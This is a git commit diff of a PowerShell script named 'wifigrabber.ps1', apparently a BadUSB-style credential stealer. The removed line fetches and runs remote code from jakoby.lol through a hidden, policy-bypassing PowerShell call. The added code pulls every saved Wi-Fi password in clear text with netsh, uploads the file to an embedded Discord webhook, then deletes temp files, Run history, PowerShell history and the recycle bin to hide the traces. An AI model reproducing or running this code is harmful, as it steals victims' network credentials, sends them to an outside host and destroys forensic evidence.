7f4f902f9c4bb168f6d7fade7fb696df1b14b38f
Brereid98 <96502949+Brereid98@users.noreply.github.com>
2023-09-28 20:18:39 +1000

    now it will work

--- WiFi_grabber/wifigrabber.ps1
+++ WiFi_grabber/wifigrabber.ps1
@@ -1,5 +1,44 @@
-powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1156889045926936596/jJZYEKagDrh_AmJRdlQsmXE8EifRf87Dj3_PMd--fcftcsk8sQbBhkOerOD2P2vUpNok';irm jakoby.lol/e8v | iex
+
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+
+function Clean-Exfil { 
+
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+RI $env:TEMP/--wifi-pass.txt
